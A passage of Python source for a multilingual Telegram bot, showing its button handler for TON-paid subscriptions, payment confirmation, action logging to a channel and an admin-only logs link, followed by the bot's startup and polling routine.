        await log_to_channel(context, f"Пользователь @{username} запросил информацию: {query.data}" if lang == 'Русский' else 
                             f"Користувач @{username} запросив інформацію: {query.data}" if lang == 'Украинский' else 
                             f"User @{username} requested information: {query.data}" if lang == 'English' else 
                             f"Benutzer @{username} hat Informationen angefordert: {query.data}", username)
        await client_telethon.disconnect()
        return
    
    if query.data in ['subscribe_1h', 'subscribe_3d', 'subscribe_7d']:
        context.user_data['selected_subscription'] = query.data.replace('subscribe_', '')
        amount = {'1h': 2, '3d': 5, '7d': 7}[context.user_data['selected_subscription']]
        await query.message.reply_text(texts['payment_wallet'].format(amount=amount, address=TON_WALLET_ADDRESS), reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(texts['payment_cancel'], callback_data='cancel_payment')],
            [InlineKeyboardButton(texts['payment_paid'], callback_data='payment_paid')]
        ]))
        await log_to_channel(context, f"Пользователь @{username} выбрал подписку: {context.user_data['selected_subscription']}" if lang == 'Русский' else 
                             f"Користувач @{username} вибрав підписку: {context.user_data['selected_subscription']}" if lang == 'Украинский' else 
                             f"User @{username} chose subscription: {context.user_data['selected_subscription']}" if lang == 'English' else 
                             f"Benutzer @{username} hat Abonnement ausgewählt: {context.user_data['selected_subscription']}", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'cancel_payment':
        context.user_data.clear()
        await query.message.reply_text("Оплата отменена." if lang == 'Русский' else "Оплату скасовано." if lang == 'Украинский' else "Payment canceled." if lang == 'English' else "Zahlung abgebrochen.")
        await log_to_channel(context, f"Пользователь @{username} отменил оплату" if lang == 'Русский' else 
                             f"Користувач @{username} скасував оплату" if lang == 'Украинский' else 
                             f"User @{username} canceled payment" if lang == 'English' else 
                             f"Benutzer @{username} hat die Zahlung abgebrochen", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'payment_paid':
        await query.message.reply_text(texts['payment_hash'])
        context.user_data['waiting_for_hash'] = True
        await log_to_channel(context, f"Пользователь @{username} указал, что оплатил подписку" if lang == 'Русский' else 
                             f"Користувач @{username} вказав, що оплатив підписку" if lang == 'Украинский' else 
                             f"User @{username} indicated that the subscription was paid" if lang == 'English' else 
                             f"Benutzer @{username} hat angegeben, dass das Abonnement bezahlt wurde", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'update_payment':
        await check_payment_status(query.message, context)
        await log_to_channel(context, f"Пользователь @{username} обновил информацию о платеже" if lang == 'Русский' else 
                             f"Користувач @{username} оновив інформацію про платіж" if lang == 'Украинский' else 
                             f"User @{username} updated payment information" if lang == 'English' else 
                             f"Benutzer @{username} hat die Zahlungsinformationen aktualisiert", username)
        await client_telethon.disconnect()
        return
    
    if query.data == 'logs_channel':
        if str(user_id) not in ADMIN_IDS:
            await query.message.reply_text("У вас нет доступа к этой функции." if lang == 'Русский' else 
                                          "У вас немає доступу до цієї функції." if lang == 'Украинский' else 
                                          "You don’t have access to this function." if lang == 'English' else 
                                          "Du hast keinen Zugriff auf diese Funktion.")
            await client_telethon.disconnect()
            return
        await query.message.reply_text(texts['logs_channel'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Перейти в канал" if lang == 'Русский' else "Перейти до каналу" if lang == 'Украинский' else "Go to channel" if lang == 'English' else "Zum Kanal gehen", url=f"https://t.me/{LOG_CHANNEL_ID.replace('-100', '')}")]]))
        await log_to_channel(context, f"Администратор @{username} запросил канал с логами" if lang == 'Русский' else 
                             f"Адміністратор @{username} запросив канал з логами" if lang == 'Украинский' else 
                             f"Administrator @{username} requested the logs channel" if lang == 'English' else 
                             f"Administrator @{username} hat den Kanal mit Logs angefordert", username)
        await client_telethon.disconnect()
        return

# Основная функция
async def main():
    try:
        await client_telethon.connect()
        print("Telethon клиент успешно подключён")

        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("language", language))
        application.add_handler(CommandHandler("set_plan", set_plan))
        application.add_handler(CommandHandler("remove_plan", remove_plan))
        application.add_handler(CommandHandler("note", note))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT | filters.FORWARDED, handle_message))
        
        await application.initialize()
        await application.start()
        print("Бот запущен, начинаем polling...")
        
        await application.updater.start_polling(drop_pending_updates=True)
        await asyncio.Future()  # Бесконечный цикл

    except Exception as e:
        print(f"Ошибка при запуске: {str(e)}\n{traceback.format_exc()}")
    finally:
        print("Завершаем работу...")
        if 'application' in locals():
            await application.updater.stop()
            await application.stop()
            await application.shutdown()
        await client_telethon.disconnect()
        sys.exit(1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Программа остановлена пользователем")
    except Exception as e:
        print(f"Ошибка в главном цикле: {str(e)}\n{traceback.format_exc()}")
